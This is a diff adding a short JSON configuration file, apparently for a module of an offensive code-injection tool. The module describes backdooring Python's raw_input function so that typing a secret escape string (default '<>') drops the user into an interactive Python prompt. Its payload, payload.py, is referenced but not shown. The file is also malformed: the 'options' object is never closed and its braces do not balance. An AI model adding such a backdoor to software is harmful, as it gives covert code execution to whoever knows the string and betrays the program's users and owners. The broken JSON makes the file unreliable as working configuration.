@@ -1,0 +1,12 @@
+{
+"info": "Injects code to backdoor the raw_input function",
+"usage": "In the raw_input prompt type '{escape}' then hit return, you will be given a python prompt",
+"options": {
+	"escape": {
+		"name": "Escape string",
+		"info": "secret string to activate backdoor",
+		"default": "<>"
+	},
+"payload": "payload.py",
+"location": "top"
+}
